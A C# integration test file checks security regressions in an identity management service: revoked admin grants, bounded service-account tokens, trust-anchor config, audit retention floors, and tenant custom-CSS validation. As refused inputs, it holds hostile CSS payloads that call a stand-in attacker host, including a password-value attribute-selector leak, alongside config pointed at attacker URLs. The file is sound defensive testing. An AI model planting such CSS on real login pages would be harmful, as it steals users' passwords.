using Microsoft.Extensions.Configuration;
using RediensIAM.Config;

namespace RediensIAM.IntegrationTests.Tests.Security;

/// <summary>
/// R-22, R-14/T-N5, T-N4, R-09 — the controls that decide what the process trusts.
/// </summary>
[Collection("RediensIAM")]
public class TrustAnchorRegressionTests(TestFixture fixture)
{
    private async Task<(Organisation Org, Project Project, UserList List)> CreateTenantAsync()
    {
        var (org, _) = await fixture.Seed.CreateOrgAsync();
        var project  = await fixture.Seed.CreateProjectAsync(org.Id);
        var list     = await fixture.Seed.CreateUserListAsync(org.Id);
        project.AssignedUserListId = list.Id;
        await fixture.Db.SaveChangesAsync();
        return (org, project, list);
    }

    // ── R-22: /service-accounts/* authorised from the token snapshot alone ───

    /// <summary>
    /// ServiceAccountController carried no [RequireManagementLevel], so it never re-checked
    /// Keto. A super-admin whose grant had been revoked kept full control of the endpoint that
    /// mints PATs on the deployment's __system__ service accounts until the token expired.
    /// </summary>
    [Fact]
    public async Task ServiceAccounts_AfterTheKetoGrantIsRevoked_AreRefused()
    {
        await fixture.FlushCacheAsync();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        var client = fixture.ClientWithToken(fixture.Seed.SuperAdminToken(admin.Id));

        fixture.Keto.AllowAll();
        (await client.GetAsync("/service-accounts")).StatusCode.Should().Be(HttpStatusCode.OK);

        await fixture.FlushCacheAsync();   // drop the 30 s live-authorisation decision
        fixture.Keto.DenyAll();

        var res = await client.GetAsync("/service-accounts");

        res.StatusCode.Should().Be(HttpStatusCode.Forbidden,
            "the token snapshot is not authority — the grant has to still exist");
        try { fixture.Keto.AllowAll(); } finally { await fixture.FlushCacheAsync(); }
    }

    /// <summary>
    /// A PAT with no expiry is a permanent credential on a service account, minted by a caller
    /// whose own grants are revocable. It is now bounded.
    /// </summary>
    [Fact]
    public async Task GeneratePat_WithNoRequestedExpiry_IsBounded()
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        var sa     = await fixture.Seed.CreateServiceAccountAsync(tenant.List.Id);
        var client = fixture.ClientWithToken(fixture.Seed.SuperAdminToken(admin.Id));

        var res = await client.PostAsJsonAsync($"/service-accounts/{sa.Id}/pat", new { name = "ci" });

        res.StatusCode.Should().Be(HttpStatusCode.OK);
        var body = await res.Content.ReadFromJsonAsync<JsonElement>();
        body.GetProperty("expires_at").ValueKind.Should().NotBe(JsonValueKind.Null,
            "a service-account credential must not outlive every revocation path the deployment has");
    }

    [Fact]
    public async Task GeneratePat_WithAnExpiryInThePast_IsRefused()
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        var sa     = await fixture.Seed.CreateServiceAccountAsync(tenant.List.Id);
        var client = fixture.ClientWithToken(fixture.Seed.SuperAdminToken(admin.Id));

        var res = await client.PostAsJsonAsync($"/service-accounts/{sa.Id}/pat",
            new { name = "stale", expires_at = DateTimeOffset.UtcNow.AddDays(-1) });

        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    // ── R-14 / T-N5: trust anchors are not readable from the instance row ────

    /// <summary>
    /// The instance row is written with the same Postgres credentials Hydra and Keto hold, and
    /// it was layered last, so it won every key it emitted. Repointing Hydra:AdminUrl made every
    /// token whatever the writer said; repointing Keto:ReadUrl made every live authorisation
    /// check answer yes. Those keys must no longer come from the row at all.
    /// </summary>
    [Fact]
    public void InstanceConfiguration_NeverEmitsTrustAnchors()
    {
        var env = new Dictionary<string, string?>(StringComparer.OrdinalIgnoreCase)
        {
            ["App:PublicUrl"]      = "http://localhost",
            ["App:Domain"]         = "localhost",
            ["App:TrustedProxies"] = "10.0.0.0/8",
            ["Hydra:AdminUrl"]     = "http://attacker.invalid",
            ["Hydra:PublicUrl"]    = "http://attacker.invalid",
            ["Keto:ReadUrl"]       = "http://attacker.invalid",
            ["Keto:WriteUrl"]      = "http://attacker.invalid",
            ["Smtp:FromName"]      = "RegressionR14",
            // Writing the instance row is an audited mutation and the chain link over it is keyed,
            // so the provider needs the encryption root the same way the rest of startup does.
            ["Security:TotpSecretEncryptionKey"] = new string('0', 64),
        };

        var provider = new InstanceConfigurationProvider(new InstanceBootstrapOptions(
            fixture.GetService<AppConfig>().ConnectionString,
            $"regression-r14-{Guid.NewGuid():N}", ReconfigureFromEnv: false, env));
        provider.Load();

        foreach (var anchor in (string[])
                 ["App:TrustedProxies", "Hydra:AdminUrl", "Hydra:PublicUrl", "Keto:ReadUrl", "Keto:WriteUrl"])
            provider.TryGet(anchor, out _).Should().BeFalse(
                $"{anchor} decides who the process believes and must come from env only");

        provider.TryGet("Smtp:FromName", out var smtp).Should().BeTrue("operational config still lives in the row");
        smtp.Should().Be("RegressionR14");
    }

    /// <summary>T-N5: a DB write must not be able to disable lockout or weaken future hashing.</summary>
    [Fact]
    public void SecurityParameters_AreClampedToASafeRange()
    {
        var cfg = new ConfigurationBuilder().AddInMemoryCollection(new Dictionary<string, string?>
        {
            ["Security:MaxLoginAttempts"] = "1000000",
            ["Security:LockoutMinutes"]   = "0",
            ["Security:ArgonTimeCost"]    = "1",
            ["Security:ArgonMemoryCost"]  = "8",
            ["Security:ArgonParallelism"] = "0",
            ["Cache:PatTtlMinutes"]       = "10080",
            ["Audit:RetentionDays"]       = "0",
        }).Build();

        var app = new AppConfig(cfg);

        app.MaxLoginAttempts.Should().BeLessThanOrEqualTo(10);
        app.LockoutMinutes.Should().BeGreaterThanOrEqualTo(1);
        app.ArgonTimeCost.Should().BeGreaterThanOrEqualTo(2);
        app.ArgonMemoryCost.Should().BeGreaterThanOrEqualTo(19456);
        app.ArgonParallelism.Should().BeGreaterThanOrEqualTo(1);
        app.PatCacheTtlMinutes.Should().BeLessThanOrEqualTo(15);
        app.AuditRetentionDays.Should().BeGreaterThanOrEqualTo(AppConfig.MinAuditRetentionDays);
    }

    // ── T-N4: an org must not be able to purge its own audit trail ───────────

    [Theory]
    [InlineData(0)]
    [InlineData(-7)]
    [InlineData(1)]
    public async Task OrgSettings_AuditRetentionBelowTheFloor_IsRefused(int days)
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        await fixture.Seed.CreateOrgRoleAsync(tenant.Org.Id, admin.Id, Roles.OrgAdmin);
        var client = fixture.ClientWithToken(fixture.Seed.OrgAdminToken(admin.Id, tenant.Org.Id));

        var res = await client.PatchAsJsonAsync("/org/settings", new { audit_retention_days = days });

        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        (await res.Content.ReadAsStringAsync()).Should().Contain("audit_retention_too_short");
        fixture.Db.ChangeTracker.Clear();
        (await fixture.Db.Organisations.AsNoTracking().FirstAsync(o => o.Id == tenant.Org.Id))
            .AuditRetentionDays.Should().NotBe(days);
    }

    [Fact]
    public async Task OrgSettings_MinusOne_StillResetsToTheGlobalDefault()
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        await fixture.Seed.CreateOrgRoleAsync(tenant.Org.Id, admin.Id, Roles.OrgAdmin);
        var client = fixture.ClientWithToken(fixture.Seed.OrgAdminToken(admin.Id, tenant.Org.Id));

        var res = await client.PatchAsJsonAsync("/org/settings", new { audit_retention_days = -1 });

        res.StatusCode.Should().Be(HttpStatusCode.OK);
    }

    // ── R-09: tenant custom_css is validated server-side ─────────────────────

    /// <summary>
    /// custom_css is rendered on the page where every user of the project types their password.
    /// It is currently mitigated only by the CSP bug of R-26 and by a client-side regex whose own
    /// header states it cannot be the guard.
    /// </summary>
    [Theory]
    [InlineData("body{background:url(https://evil.invalid/x)}")]
    [InlineData("@import url('https://evil.invalid/x.css');")]
    [InlineData("input[type=password][value^='a']{background:URL (https://evil.invalid/a)}")]
    [InlineData("a::after{content:attr(value)}")]
    [InlineData("body{color:red}/* hidden */")]
    public async Task ProjectInfo_HostileCustomCss_IsRefused(string css)
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        var client = fixture.ClientWithToken(
            fixture.Seed.ProjectManagerToken(admin.Id, tenant.Org.Id, tenant.Project.Id));

        var res = await client.PatchAsJsonAsync("/project/info",
            new { login_theme = new { custom_css = css } });

        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        fixture.Db.ChangeTracker.Clear();
        var stored = await fixture.Db.Projects.AsNoTracking().FirstAsync(p => p.Id == tenant.Project.Id);
        (stored.LoginTheme?.ContainsKey("custom_css") ?? false).Should().BeFalse();
    }

    /// <summary>The org route reached ApplyLoginTheme without any validation at all.</summary>
    [Fact]
    public async Task OrgProjectUpdate_HostileCustomCss_IsRefused()
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        await fixture.Seed.CreateOrgRoleAsync(tenant.Org.Id, admin.Id, Roles.OrgAdmin);
        var client = fixture.ClientWithToken(fixture.Seed.OrgAdminToken(admin.Id, tenant.Org.Id));

        var res = await client.PatchAsJsonAsync($"/org/projects/{tenant.Project.Id}",
            new { login_theme = new { custom_css = "@import url('https://evil.invalid/x.css');" } });

        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    /// <summary>The same route silently accepted a non-HTTPS logo the project route refused.</summary>
    [Fact]
    public async Task OrgProjectUpdate_NonHttpsLogo_IsRefused()
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        await fixture.Seed.CreateOrgRoleAsync(tenant.Org.Id, admin.Id, Roles.OrgAdmin);
        var client = fixture.ClientWithToken(fixture.Seed.OrgAdminToken(admin.Id, tenant.Org.Id));

        var res = await client.PatchAsJsonAsync($"/org/projects/{tenant.Project.Id}",
            new { login_theme = new { logo_url = "http://evil.invalid/logo.png" } });

        res.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Fact]
    public async Task ProjectInfo_OrdinaryCustomCss_IsStillAccepted()
    {
        await fixture.FlushCacheAsync();
        fixture.Keto.AllowAll();
        var tenant = await CreateTenantAsync();
        var admin  = await fixture.Seed.CreateUserAsync(tenant.List.Id);
        var client = fixture.ClientWithToken(
            fixture.Seed.ProjectManagerToken(admin.Id, tenant.Org.Id, tenant.Project.Id));

        var res = await client.PatchAsJsonAsync("/project/info",
            new { login_theme = new { custom_css = ".login-card > h1 { color: #123456; font-weight: 600; }" } });

        res.StatusCode.Should().Be(HttpStatusCode.OK);
    }
}
